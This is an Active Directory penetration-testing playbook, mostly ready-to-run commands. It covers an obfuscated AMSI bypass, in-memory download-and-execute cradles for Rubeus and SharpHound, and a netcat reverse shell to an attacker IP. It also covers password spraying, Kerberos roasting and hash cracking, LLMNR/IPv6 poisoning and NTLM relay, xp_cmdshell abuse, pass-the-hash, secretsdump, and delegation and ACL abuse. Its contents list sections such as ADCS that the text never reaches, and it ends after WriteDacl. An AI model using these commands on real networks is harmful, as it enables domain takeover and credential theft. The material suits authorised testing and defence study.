# AD Pentest methodology 

## Table of Contents

1. [Prerequisite](#prerequisite)
2. [Enumeration](#enumeration)
   - [Find DC (Domain Controller) IP addresses](#find-dc-domain-controller-ip-addresses)
     - [Using PowerView](#using-powerview)
     - [Using Linux tools](#using-linux-tools)
   - [Get forest and other domains](#get-forest-and-other-domains)
   - [Enumerating users and computers](#enumerating-users-and-computers)
   - [Setting up /etc/hosts and Linux kerberos client](#setting-up-etc-hosts-and-linux-kerberos-client)
3. [Security test checklist](#security-test-checklist)
   - [Testing anonymous sessions enumeration](#testing-anonymous-sessions-enumeration)
   - [Testing guest access on shares](#testing-guest-access-on-shares)
   - [ASREP-roasting](#asrep-roasting)
   - [Password Spraying](#password-spraying)
   - [Kerberoasting](#kerberoasting)
   - [Share enumeration](#share-enumeration)
     - [Searching for GPOs files containing potential secrets](#searching-for-gpos-files-containing-potential-secrets)
   - [LLMNR & Netbios & MDNS poisoning](#llmnr--netbios--mdns-poisoning)
   - [NTLM relay](#ntlm-relay)
   - [IPv6 poisoning](#ipv6-poisoning)
   - [Common DC exploits](#common-dc-exploits)
     - [SamAccountName (nopac)](#samaccountname-nopac)
     - [PrintNightmare](#printnightmare)
     - [Zerologon](#zerologon)
   - [MSSQL servers exploit](#mssql-servers-exploit)
4. [This won't use trusted SQL links](#this-wont-use-trusted-sql-links)
5. [Lateral movement techniques](#lateral-movement-techniques)
   - [PassTheHash](#passthehash)
6. [Checking for delegations](#checking-for-delegations)
   - [Unconstrained delegation](#unconstrained-delegation)
   - [Constrained delegation](#constrained-delegation)
   - [Resource Based Constrained Delegation](#resource-based-constrained-delegation)
7. [ACL Abuse](#acl-abuse)
   - [Abusing ForceChangePassword](#abusing-forcechangepassword)
   - [Abusing GenericWrite on User](#abusing-genericwrite-on-user)
   - [Abusing GenericWrite on Computer](#abusing-genericwrite-on-computer)
   - [Abusing WriteDacl on User](#abusing-writedacl-on-user)
   - [Abusing Add self/AddMember on Group](#abusing-add-selfaddmember-on-group)
   - [Abusing WriteOwner on Group](#abusing-writeowner-on-group)
   - [Abusing Generic all on user](#abusing-generic-all-on-user)
   - [Abusing Generic all on group](#abusing-generic-all-on-group)
   - [Abusing GenericAll / GenericWrite / Write on computer/user](#abusing-genericall--genericwrite--write-on-computeruser)
   - [Reading LAPS password](#reading-laps-password)
   - [Abusing privileges over GPOs](#abusing-privileges-over-gpos)
8. [ADCS](#adcs)
   - [Misconfigured Certificate Templates - ESC1](#misconfigured-certificate-templates---esc1)
   - [Misconfigured Certificate Templates - ESC2](#misconfigured-certificate-templates---esc2)
   - [Misconfigured Enrolment Agent Templates - ESC3](#misconfigured-enrolment-agent-templates---esc3)
   - [Vulnerable Certificate Template Access Control - ESC4](#vulnerable-certificate-template-access-control---esc4)
   - [Vulnerable PKI Object Access Control - ESC5](#vulnerable-pki-object-access-control---esc5)
   - [EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6](#editf_attributesubjectaltname2---esc6)
   - [Vulnerable Certificate Authority Access Control - ESC7](#vulnerable-certificate-authority-access-control---esc7)
   - [NTLM Relay to AD CS HTTP Endpoints – ESC8](#ntlm-relay-to-ad-cs-http-endpoints--esc8)
9. [Abusing trust relationship](#abusing-trust-relationship)
10. [Configuration checking](#configuration-checking)
    - [Checking ADIDNS configuration](#checking-adidns-configuration)
    - [Check Channel binding and LDAP signing configuration](#check-channel-binding-and-ldap-signing-configuration)
    - [Password Policy checking](#password-policy-checking)
    - [Machine quota](#machine-quota)
    - [Health check analysis](#health-check-analysis)
11. [References](#references)


## Prerequisite
- Domain user account (username and password) 
- Network access to the AD environment
- Windows computer 
- Linux computer (Kali Linux is a good option)

## Enumeration 
The enumeration process may be performed on Windows using [PowerView Script on GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) or using OpenSource tools from Linux. 

### Find DC (Domain Controller) IP addressess
#### Using PowerView
PowerView is generally flagged on monitored windows and often required to bypass AMSI (Antimalware Scan Interface)
The following script may help bypass the AMSI in a PowerShell context:

```
Get-DomainController | Select-Object -Property Name,IPAddress
#In case of multiple domains
Get-DomainController -Domain my.domain.com | Select-Object -Property Name,IPAddress
```
#### Using Linux tools 
The first step would be to ping the domain name. Ex: `ping my.domain.com`. The IP address printed would probably match the with the IP address of **one** of the DC.
In order to confirm the IP address printed belongs to the DC, an **nmap to port 88** may be necessary. The port 88 is associated to Kerberos service which is hosted on DCs.

### Get forest and other domains  
A forest is a collection of one or more domains that share a common schema, global catalog, and configuration, with automatic trust relationships between the domains.

```
#Get Forest
Get-NetForest
Get-DomainTrustMapping

#Get domains of the forest
Get-ForestDomain
Get-ForestDomain -Forest forestname
#forestname is the name of the forest 
```
### Enumerating users and computers
**With PowerView**
```
Get-DomainUser | select samaccountname | Out-File -Encoding utf8 users.txt
Get-DomainComputer | select dnshostname | Out-File -Encoding utf8 computers.txt
```
**With impacket**
When LDAP Signing is enabled, NTLM authentication does not work, so it is recommended to use Kerberos authentication.
Therefore, a TGT (Ticket Granting Ticket) is needed, which requires the Linux Kerberos client to be installed and configured:
```
sudo apt install krb5-user
```
During installation, a realm may be requested as input. The realm defines the domain where authentication and access control policies apply (for example: my.domain.com).

After installation, the /etc/krb5.conf file should be configured. The following lines are an example of the configuration for the corp domain:
```
[libdefaults]
	default_realm = my.domain.com
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true
    rdns = false
    # The following libdefaults parameters are only for Heimdal Kerberos.
	fcc-mit-ticketflags = true

[realms]

my.domain.com = {
      kdc = DC.my.domain.com
      admin_server = DC.my.domain.com
}
```
After that configuration set, the TGT can be requested, in the bolow example, a TGT is requested for pentestuser account :

```
getTGT.py my.domain.com/pentestusersa -dc-ip 10.x.x.x
```
The above command will ask for a password and if correct will obtain a TGT stored in file named username.ccache (Ex: pentestuser.ccache)
Next, TGT needs to be included in the environment with 
```
export KRB5CCNAME=pentestusersa.ccache 
```
At this step, kerberos authentication can be used with impacket tool for enumeration
```
GetADUsers.py -dc-ip 10.X.X.X  my.domain.com/pentestuser -k -no-pass
GetADComputers.py -dc-ip 10.X.X.X  my.domain.com/pentestuser -k -no-pass
```
### Seting up /etc/hosts and Linux kerberos client
Example of /etc/hosts for my.domain.com

## Security test check list
### Testing anonymous sessions enumeration 
With crackmapexec (on Linux)
```
crackmapexec smb 10.X.X.X --users
#Assuming 10.X.X.X is one of the DC IP address
```
With enum4linux 
```
enum4linux 192.168.56.11

```

### Testing guest access on shares
```
crackmapexec smb 10.X.X.X -u 'a' -p '' --shares
crackmapexec smb computers.txt -u 'a' -p '' --shares
```
In the above example, computers.txt is a file containing the **dnshostname**  of every computer beloging to the domain computers group
### ASREP - roasting
**AS-REP Roasting** is an attack technique used in Active Directory (AD) environments to target user accounts that do not require pre-authentication when requesting a Kerberos ticket. When pre-authentication is disabled, anyone could ask for a TGT in the name of one of these accounts, without sending any authenticator, and the domain controller will send back a KRB_AS_REP which is encrypted with user's password. Therefore, it can be cracked offline.

- **Prerequisite for this check** : List of domain users
- Command with impacket
```
GetNPUsers.py my.domain.com/ -no-pass -usersfile users.txt
```
The **/** at the end of the domain name is important 
- Cracking with hashcat 
```
hashcat -m 18200 asrephash rockyou2024.txt
```
### Password Spraying

- Scripting
```
for password in `cat default_weak_pass.txt`; 
do
crackmapexec smb 10.X.X.X -u users.txt -p $password | tee --append spray.txt ;
sleep 5m;
done 

cat spray.txt | grep '+';
```
**NB:** This script may take very long to run 

### Kerberoasting
Kerberoasting is an attack that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name (SPN). *An SPN is an attribute that ties a service to a user account within the AD.* The attacker impersonates an account user with a service principal name (SPN) and requests a service-related ticket. The password hash can be then cracked offline and used to log in with the plaintext credentials for advance attack.

Attacking with PowerView
```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format John | Export-Csv .\kerberoast.csv -NoTypeInformation
```
Attacking with impacket
```
GetUserSPNs.py -request -dc-ip 10.X.X.X -k -nopass my.domain.com/pentestuser -outputfile kerberoasting.hashes
```
Cracking with hashcat 
```
hashcat -m 13100 -a 0 kerberoasting.hashes rockyou2024.txt --force
```
Cracking with John
```
/john kerberoasting.hashes --wordlist=rockyou2024.txt
```
### Share enumeration
- With PowerView
```
Find-DomainShare -CheckShareAccess -ErrorAction SilentlyContinue   | Where-Object {$_.Name -ne 'print$' -and $_.Name -ne 'Admin$' -and $_.Name -ne 'C$' -and $_.Name -ne 'IPC$'} | select Name,ComputerName | ft -AutoSize | Out-File -Encoding utf8 Shares.txt
```
- Crackmapexec
**Prerequisite** : List of domain computers
```
crackmapexec smb computers.txt -u pentestuser -k --shares | tee --append shares.txt
```
#### Searching for GPOs files containing potentials secrets 
Sometimes, GPOs files hold secret such as credentials. The following PowerShell Script may help to list the files potentially containing secrets:
```
$domainname=(Get-Domain).Name
$sourcePath = "\\$domainname\SysVol\$domainname\Policies"

Get-ChildItem -Path $sourcePath | ForEach-Object{ Get-ChildItem -Path $_.FullName -Recurse -File -Exclude "*.adml","*.adm","*.admx",".pol","GptTmpl.inf","Registry.xml","Services.xml","Folders.xml","Groups.xml","Files.xml" -ErrorAction SilentlyContinue  | Select-String -Pattern 'user', 'login', 'pass', 'pwd', 'psw', 'database', 'secret', 'password', 'vnc'  -AllMatches -ErrorAction SilentlyContinue | Select-Object -Unique Path }
```
*DC.my.domain.com* should be replaced by a valid dnsname of a Domain Controller and *my.domain.com* with the domain name.
### LLMNR & Netbios & MDNS poisoning  
- **LLMNR** (Link-Local Multicast Name Resolution): A protocol used to resolve names (like a computer name) to IP addresses within the same local network when DNS isn't available. It sends out a network-wide request asking "Who is this computer?"

- **NetBIOS** (Network Basic Input/Output System): An older protocol that helps computers on the same network communicate and resolve names (computer names) to IP addresses. It predates DNS and works in local network environments.

- **mDNS** (Multicast DNS): Similar to LLMNR, but used more often in environments like home networks or non-Windows devices. It resolves hostnames to IP addresses without the need for a DNS server.

These protocols are fallback name resolution mechanisms that can be exploited by attackers for poisoning attacks (specifically, name resolution poisoning) using `responder`.
Assuming the network interface for the machine is eth0 the command to poison the answers to the above protocols and potentially received users credentials is:
```
sudo responder -I eth0
```
The hashes obtained may be cracked offline using tools like `hashcat` and `john` as follows:
```
hashcat -m 5600 --force -a 0 responder.hashes rockyou2024.txt 
```
### NTLM relay
When SMB signing is disabled on a computer, it is possible to perform an NTLM relay attack. In this scenario, the NTLM authentication messages are intercepted and relayed to another machine (without decrypting them), allowing unauthorized access.
- The following command may help to identify computers with SMB signing disabled:
```
crackmapexec smb computers.txt --gen-relay-list smb_targets.txt
```
- In order to relay NTLM authentication messages, `responder` must stop smb and http server as the purpose is to relay hashes to `ntlmrelayx.py` instead of getting them:
```
sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```
In the above commands, responder's configuration file is assumed to be located at /opt/tools/Responder/Responder.conf. This should be changed according to the pentester environment.

- Next, the relay tool should be up :
```
ntlmrelayx.py --no-http-server -smb2support -tf smb_targets.txt -c 'powershell -enc KABOAGU...'
```
`-c` option specify the command that may be run once the relay has been performed successfully 

- At this step, `responder` can be launched again to redirect queries to the relay server
```
sudo responder -I eth0
```
### IPv6 poisoining
Another useful way to poison the network is by giving answer to DHCPv6 requests and setting the attacker host as the default DNS server of the network. Windows by default prefers IPv6 over IPv4 so it is possible to capture and poison the response to DHCPv6 query to change the DNS server and redirect queries to the pentester machine with the tool `mitm6`. Below are the steps to be taken:
- Start `mitm6` to poison dhcpv6 and get dns request from the hosts
```
sudo mitm6 -i eth0 -d my.domain.com --debug
```
`my.domain.com` represents here the target domain name
- Answer to wpad queries and relay the http query to ldaps on the domain controller to add a computer with delegate access

```
ntlmrelayx.py -6 -wh wpadfakeserver.my.domain.com -t ldaps://DC.my.domain.com --add-computer relayedpccreate --delegate-access -l ~/loot
```
If this attack success, it will create a new computer with delegate access to the victim server, that means it will set the `msDS-AllowedToActOnBehalfOfOtherIdentity` of the victim server to the created one.

`DC.my.domain.com` represents here the Domain Controller and `~/loot` a directory where all the informations on the ldap will be automatically dumped.
### Common DC exploit

#### SamAccountName (nopac)
This combines CVE-2021-42287/CVE-2021-42278 and allows to impersonate DA from standard domain user
- Check the vulnerable state of a DC
```
crackmapexec smb DC -u pentestuser -k -M nopac
```
The scan and the exploitation can be automate via [noPac](https://github.com/cube0x0/noPac) tool
#### PrintNightmare
PrintNightmare is a vulnerability in the **Windows Print Spooler service** that allows remote attackers to execute code with SYSTEM-level privileges.

PrintSpooler service can be scan with: 
```
rpcdump.py @10.X.X.X | egrep 'MS-RPRN|MS-PAR'
```
PrintNightmare vulnerability can be scanned using github opensource.

#### Zerologon
Zerologon (CVE-2020-1472) is a vulnerability in the Netlogon Remote Protocol (MS-NRPC) used by Windows servers. It allows an attacker to gain domain administrator access to an Active Directory domain controller without needing valid credentials.
- Check the vulnerable state of a DC
```
crackmapexec smb DC -u pentestuser -k -M zerologon
```
The exploitation can be automated with [CVE-2020-1472 POC](https://github.com/dirkjanm/CVE-2020-1472)
### MSSQL servers exploit
- Enumerate the MSSQL servers
```
GetUserSPNs.py my.domain.com/pentestuser -k -no-pass  | grep 1433

crackmapexec mssql mssql_servers.txt -u pentestuser -p mYPa$$word -d my.domain.com 
```
The powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) can also help for enumeration.

- Enumerating from the network without domain session
```
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#If you don't have a AD account, you can try to find MSSQL scanning via UDP
#First, you will need a list of hosts to scan
Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10

#If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them
#The discovered MSSQL servers must be on the file: C:\temp\instances.txt
Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
```

- Enumerating from inside the domain
```
# Get local MSSQL instance (if any)
Get-SQLInstanceLocal
Get-SQLInstanceLocal | Get-SQLServerInfo

#Get info about valid MSQL instances running in domain
#This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose 

#Test connections with each one
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose

#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Get DBs, test connections and get info in oneliner
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
```
If any of the owned user has the privilege to connect to the mssql server, the connexion can be performed using `mssqlclient.py` as follows:
```
mssqlclient.py -windows-auth my.domain.com/pentestuser:MyPassWord@10.234.0.46
```
- Login enumeration
```
enum_logins
```
-  List all login with impersonation permission
```
enum_impersonate
```
- Impersonate user (sa user for example)
```
exec_as_login sa
enable_xp_cmdshell
xp_cmdshell whoami
```
This command launch the following:
```
execute as login='sa';
exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'
```
- Coerce authentication via xp_dirtree 
```
exec master.sys.xp_dirtree '\\192.168.80.1\demontlm',1,1
```
- Listing trusted links
```
enum_links

#or
EXEC sp_linkedservers
EXEC sp_helplinkedsrvlogin
```
- Using link to can get a command injection 
```
use_link LINK_NAME
enable_xp_cmdshell
xp_cmdshell whoami
```

`PowerUpSQL` can also help in MSSQL exploitation:
```
#Perform a SQL query
Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"

#Dump an instance (a lotof CVSs generated in current dir)
Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"

# Search keywords in columns trying to access the MSSQL DBs
## This won't use trusted SQL links
Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize

Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
# Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
```
### Lateral movement techniques
When a Domain Admin credentials has been obtained, it is possible to extract the NTLM hashes of users of the domain:
```
secretsdump.py admpentest01:'MyPassword'@10.X.X.X -just-dc-ntlm -outputfile hash.txt
```
#### PassTheHash
With a hash obtained, it is possible to spray it against domain computers. When there is no LAPS (Local Administrator Password Solution) implemented, Local admin account is often the same on most computers. The test can be done locally with `--local-auth` parameter:
```
crackmapexec smb computers.txt -u Administrator -H 'aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe' --local-auth
```
**Lateral Move using impacket**
`impacket` contains a list of tools that can be helpful for performing lateral movement within a network. These tools use various techniques. The prerequisite input is a valid privileged user credentials (username and password/hash).
- PsExec
PsExec uses SMB with administrative privilege to upload a malicious executable on the target file, then create a service to run the malicious executable. 
```
psexec.py -hashes ':aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe' my.domain.com/pentestuser@10.X.X.X
psexec.py my.domain.com/pentestuser:MyPassWod@10.X.X.X
psexec.py my.domain.com/pentestuser@10.X.X.X -k -no-pass
psexec.py my.domain.com/pentestuser:MyPassWod@10.X.X.X -c powershell.exe
```
**Note**: PsExec is usually flagged by antivirus because of the malicious file uploaded on the target disk.
- WmiExec
WmiExec is a remote code execution tool that leverages Windows Management Instrumentation (WMI) to run commands on a target machine. 
```
wmiexec.py -hashes ':aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe' my.domain.com/pentestuser@10.X.X.X
wmiexec.py my.domain.com/pentestuser:MyPassWod@10.X.X.X
wmiexec.py my.domain.com/pentestuser@10.X.X.X -k -no-pass
```
**Note**: Unlike PsExec, it doesn’t create a service on the target system which makes it better for intrusion detection.
- SmbExec
It operates by creating a temporary service on the target machine to execute commands via cmd.exe, without dropping any binaries.
```
smbexec.py -hashes ':aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe' my.domain.com/pentestuser@10.X.X.X
smbexec.py my.domain.com/pentestuser:MyPassWod@10.X.X.X
smbexec.py my.domain.com/pentestuser@10.X.X.X -k -no-pass
```
- AtExec
It creates and runs an immediate scheduled task on a remote target via SMB in order to execute commands on a target system.
```
atexec.py my.domain.com/pentestuser:MyPassWod@10.X.X.X whoami
atexec.py -hashes  ':aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe' my.domain.com/pentestuser@10.X.X.X' whoami
atexec.py -no-pass -k my.domain.com/pentestuser@10.X.X.X 'powershell -c "nc.exe attacker_ip 4545 -e cmd.exe"'
```
- DcomExec
It is designed to remotely execute commands on a target system using DCOM (Distributed Component Object Model) and RPC (Remote Procedure Call).
- crackmapexec
```
crackmapexec smb 10.X.X.X -H ':aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe' -d 'my.domain.com' -u 'pentestuser' -x whoami
```
- Winrm
Windows Remote Management (WinRM) allows remote management and execution of commands on Windows machines, based on WS-Management. It uses ports 5985 and 5986 respectively for HTTP-based and HTTPS-based connection.
```
evil-winrm -i 10.X.X.X -u pentestuser -H 'aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe'
evil-winrm -i 10.X.X.X -u pentestuser -p mypassword
```
- RDP
Before being able to connect to host via RDP, the account should be added to the **Remote Desktop Users** group:
```
net localgroup "Remote Desktop Users" pentestuser /add
#connecting to RDP from Linux  computer
xfreerdp /u:pentestuser /d:my.domain.com /p:mypassword /v:10.X.X.X
xfreerdp /u:pentestuser /d:my.domain.com /pth:aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe /v:10.X.X.X
```
### Checking for delegations
There is three type of delegation in active directory : 
- Unconstrained delegation
- Constrained delegation
- Resource based delegation
#### Unconstrained delegation
- Unconstrained delegation is a feature that a Domain Administrator can set to any Computer inside the domain running services like IIS, MSSQL, etc. 
- Those services usually require access to some back-end database (or some other server), so it can read/modify the database on the authenticated user's behalf.
- When a user authenticates to a computer having kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory so that the computer can impersonate the authenticated user as and when required for accessing any other services on that user's behalf.

This represents a risk as an attacker with **Administrator privileges** on the computer will be able to dump the tickets and impersonate the users on any machine.
- Enumerating unconstrained delegation with bloodhound query
```
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2 {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2
```
- Enumerating unconstrained delegation with PowerView
```
Get-DomainComputer -Unconstrained | select-object -property cn
```
**Note**: Domain Controllers have unconstrained delegation set by default; it is not a security misconfiguration.

**Exploiting unconstrained delegation**
Abusing unconstrained delegation requires a privilege access to the computer and the simplest way to exploit is using `Rubeus` tool. The following steps can be performed :
- Open an Admin PowerShell session on the computer and bypass AMSI to avoid detection:
```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true);
```
- Launch Rubeus in memory with execute assembly and list the available tickets : (Rubeus.exe should be at that step saved on the pentester machine)
```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.80.1:8080/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data);
[Rubeus.Program]::MainString("triage");
```
-  From the pentest machine, force a coerce of any domain controller to the victim machine (the one with unconstrained delegation set). 
```
python3 coercer.py -u pentestuser -d my.domain.com -p MyPassW0rd -t DC.my.domain.com -l computer_having_unconstrained_delegation.my.domain.com
```
- List again the available tickets with Rubeus and extract the new ticket
```
[Rubeus.Program]::MainString("triage")

[Rubeus.Program]::MainString("dump /user:DC$ /service:krbtgt /nowrap");
```
At this step, the ticket will be displayed in base64 encoded format, with space and line return.
It can be copy to a linux machine and converted to ccache file as follows:
```
cat tgt.b64|base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
```

The ticket can then be imported and used for to extract domain users password hash:
```
export KRB5CCNAME=ticket.ccache
secretsdump.py -k -no-pass my.domain.com/'DC$'@DC.my.domain.com
```
#### Constrained delegation
Constrained delegation a security feature that allows a service to impersonate a user, but only for accessing specific services that are explicitly defined. Unlike unconstrained delegation, where a service can impersonate a user to access any resource on the network, constrained delegation limits the resources that the service can access on behalf of the user.

- Enumerating Constrained Delegation with bloodhound
```
MATCH p=(u)-[:AllowedToDelegate]->(c) RETURN p
```
- Enumerate Constrained Delegation with PowerView
```
Get-DomainUser -TrustedToAuth | select-object -property cn

Get-DomainComputer -TrustedToAuth | select-object -property cn
```
- Enumerate Constrained Delegation with impacket
```
findDelegation.py my.domain.com/pentestuser -k -no-pass -target-domain my.domain.com
```

- Exploiting contrained delegation with impacket
```
getST.py -spn 'CIFS/MACHINEACCOUNT' -impersonate Administrator -dc-ip '10.X.X.X' 'my.domain.com/pentestuser -k -no-pass'
```
This will generate a TGS that can be imported to connect to MACHINEACCOUNT if SMB is enabled. 

Here assumption is `pentestuser` account has `AllowedToDelegate` privilege over `MACHINEACCOUNT`.

**Note**: The TGS can also be requested for other services. The CIFS service here is a good candidate as it can be used for remote access.


#### Resource Based Constrained Delegation
Resource-Based Constrained Delegation (RBCD) is an extension of constrained delegation that allows resource owners to control which accounts are allowed to delegate to them. Unlike traditional constrained delegation, where delegation is configured on the account that requests the delegation, RBCD allows configuration on the target resource.

RBCD can be abused by an account being able to edit the attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` of a computer. The exploit requires the possibility to add a computer account into the AD. By default, a domain user account can add up to 10 machine account, this can be verify with the following commands:

```
#PowerView
Get-DomainObject -Identity my.domain.com -Properties ms-DS-MachineAccountQuota

#bloodyAD
bloodyad -d $DOMAIN -u $USER -p $PASSWORD --host $DOMAIN_CONTROLLER get object 'DC=acme,DC=local' --attr ms-DS-MachineAccountQuota

#ldeep
ldeep ldap -d $DOMAIN -u $USER -p $PASSWORD -s $DOMAIN_CONTROLLER search '(objectclass=domain)' | jq '.[]."ms-DS-MachineAccountQuota"'

#crackmapexec
crackmapexec ldap $DOMAIN_CONTROLLER  -u $USER -p $PASSWORD -M MAQ
```
Assuming `pentestuser` account has the privilege to edit `msDS-AllowedToActOnBehalfOfOtherIdentity` of `MACHINEACCOUNT` and can add a computer account in the AD, the exploit can be done with the following steps:
- Create a computer X (rbcd$)
```
addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host my.domain.com 'my.domain.com/pentestuser:myPass0Rd'
```
- Add delegation write on our target from X
```
rbcd.py -delegate-from 'rbcd$' -delegate-to 'MACHINEACCOUNT$' -dc-ip 'DC.my.domain.com' -action 'write' my.domain.com/pentestuser:myPass0Rd
```
- Perform an s4u2self query followed by an S4u2proxy
```
getST.py -spn 'cifs/DC.my.domain.com' -impersonate Administrator -dc-ip 'DC.my.domain.com' my.domain.com/pentestuser:myPass0Rd

export KRB5CCNAME=Administrator@cifs_DC.my.domain.com@my.domain.com.ccache
wmiexec.py  -u Administrator -k -no-pass @DC.my.domain.com
```
Once the exploit is successful, rbcd entry can be flushed and the computer account deleted :
```
rbcd.py -delegate-from 'rbcd$' -delegate-to 'MACHINEACCOUNT$' -dc-ip 'DC.my.domain.com' -action 'flush' my.domain.com/pentestuser:myPass0Rd

addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host DC.my.domain.com 'my.domain.com/pentestuser:myPass0Rd' -delete
```
### ACL Abuse
Bloodhound can help to enumarate ACL on a domain. It can be executed from Windows computer (using SharpHound) or Linux  computer (using bloodhound-python): 
- Windows 
SharpHound can be run as an exe file or from memory in PowerShell
```
#As an exe file from Domain joined Windows
SharpHound.exe -c All --domain my.domain.com --searchforest --zipfilename corp.zip

#From PowerShell 
(New-Object System.Net.WebClient).DownloadString('http://192.168.90.128:8000/SharpHound.ps1') | IEX
Invoke-BloodHound -CollectionMethod All -Domain my.domain.com -ZipFilename corp -SearchForest
```
- Linux
```
bloodhound-python -u pentestuser -p MyPass  -d my.domain.com -ns 10.X.X.X --dns-tcp -c All --zip --dns-timeout 120

bloodhound-python -u 'pentestuser' --hashes aad3b435b51404eeaad3b435b51404ee:aaaaaaaaaabbbbbbbbbbbcccccddddeeecfe -d my.domain.com  -ns 10.X.X.X --dns-tcp -c All --zip --dns-timeout 120
```
The `ns` option is for the DNS server which in some cases differs from the DC.
The output from the commands above is a zip file that should be imported in `Bloodhound` GUI.
Below are the commands to install and launch `BloodHound`:
```
sudo apt update && sudo apt install -y bloodhound
sudo neo4j console
bloodhound
```
When looking for ACL, a care should be given to the following privileges given to owned accounts:
- ForceChangePassword 
- GenericWrite  
- WriteDacl  
- Add self 
- AddMember  
- WriteOwner  
- GenericAll  
- Read Laps password 
- ForceChangePassword 

These privileges should be checked from the following targets:
- Domain Users group
- Domain Computers group
- Owned users and/or computers object

#### Abusing ForceChangePassword
Assuming user `pentestuser` has ForceChangePassword privilege over user `admuser`.  using PowerView :
```
$creds = New-Object System.Management.Automation.PSCredential ("my.domain.com\pentestuser", (ConvertTo-SecureString "MyPass$w0d" -AsPlainText -Force))
$UserPassword = ConvertTo-SecureString 'NewP@$$w0rd' -AsPlainText -Force
Set-DomainUserPassword -Identity admuser -AccountPassword $UserPassword -Credential $creds -Verbose
```
In some special cases, it is needed to change computer password; PowerView does not contain by defaut Set-DomainComputerPassword. It has been implemented here [Set-DomainComputerPassword](https://github.com/pentestusersa/SetDomainComputerPassword)

#### Abusing GenericWrite on User
This permission allows an attacker to modify user properties and can be exploited in different ways: 
- **targetKerberoasting**
Here, it is matter of adding an SPN to the user, asking for a tgs, removing the SPN on the user, and cracking the TGS just like a classic kerberoasting. For this to be succesful, the user password should be weak enough to be cracked.
```
targetedKerberoast.py -v -d my.domain.com -u pentestuser -p myPassWord --request-user admuser
```
- **logonScript**
The attacker can change the logon script path of a user to execute a malicious script upon user logon. This is achieved by using the `Set-ADObject` command to update the `scriptpath` property of the target user to point to the attacker's script:
```
Set-ADObject -SamAccountName admuser -PropertyName scriptpath -PropertyValue "\\10.0.0.5\newlogonScript.ps1"
```
To show the scriptpath ldap value `ldeep` tool can be used ldeep :
```
ldeep ldap -u pentestuser -p 'myPassWord' -d my.domain.com -s ldap://10.X.X.X search '(sAMAccountName=admuser)' scriptpath
```
#### Abusing GenericWrite on Computer
With this privilege, attackers can manipulate group membership, such as adding themselves or other users to specific groups. Below is an example of achieve it with PowerView:
``` 
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('my.domain.com\pentestuser', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'admuser' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'admuser' -Verbose
```
#### Abusing WriteDacl on User
Having WriteDACL privileges enables an attacker to grant himself any permission over the user including "Full Control":
```
#Reading pentestuser’s right on admuser :
dacledit.py -action 'read' -principal pentestuser -target 'admuser' 'my.domain.com'/'pentestuser':'myPassWord'

#Granting FullControl permission
dacledit.py -action 'write' -rights 'FullControl' -principal pentestuser -target 'admuser' 'my.domain.com'/'pentestuser':'myPassWord'
```
The FullControl permission grants the ability to fully control an object, including resetting its password or performing attacks such as target kerberoasting, for example.

